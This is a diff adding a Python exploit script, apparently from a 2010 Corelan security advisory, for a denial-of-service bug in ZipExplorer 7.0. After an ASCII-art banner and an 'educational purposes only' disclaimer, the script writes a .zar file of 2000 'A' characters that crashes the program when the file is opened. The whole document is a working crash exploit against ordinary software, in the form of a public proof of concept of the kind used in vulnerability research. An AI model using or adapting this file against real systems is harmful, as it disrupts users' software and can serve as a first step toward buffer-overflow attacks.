@@ -1,0 +1,39 @@
+#!/usr/bin/python
+#
+# Title:                ZipExplorer 7.0 (.zar) DoS
+# Advisory:             http://www.corelan.be:8800/advisories.php?id=10-045
+# Author:               TecR0c - http://tecninja.net/blog
+# Found by:             TecR0c - http://twitter.com/TecR0c
+# Date:                 June 1st, 2010
+# Download:             http://home.online.no/~arnholm/org/exe/ZipX70sh.exe
+# Platform:             Windows XP sp3 En
+# Greetz to:            Corelan Security Team
+# http://www.corelan.be:8800/index.php/security/corelan-team-members/
+#
+# Script provided 'as is', without any warranty.
+# Use for educational purposes only.
+# Do not use this code to do anything illegal !
+#
+# Note : you are not allowed to edit/modify this code.
+# If you do, Corelan cannot be held responsible for any damages this may cause.
+
+# Usage: Launch Application > Open > Navigate to file > Double click > BOOM
+
+print "|------------------------------------------------------------------|"
+print "|                         __               __                      |"
+print "|   _________  ________  / /___ _____     / /____  ____ _____ ___  |"
+print "|  / ___/ __ \/ ___/ _ \/ / __ `/ __ \   / __/ _ \/ __ `/ __ `__ \ |"
+print "| / /__/ /_/ / /  /  __/ / /_/ / / / /  / /_/  __/ /_/ / / / / / / |"
+print "| \___/\____/_/   \___/_/\__,_/_/ /_/   \__/\___/\__,_/_/ /_/ /_/  |"
+print "|                                                                  |"
+print "|                                       http://www.corelan.be:8800 |"
+print "|                                              security@corelan.be |"
+print "|                                                                  |"
+print "|-------------------------------------------------[ EIP Hunters ]--|"
+print "[+] ZipExplorer 7.0 (.zar) DoS - by TecR0c"
+
+dos = "\x41" * 2000
+
+mefile = open('tecr0c.zar','w');
+mefile.write(dos);
+mefile.close()
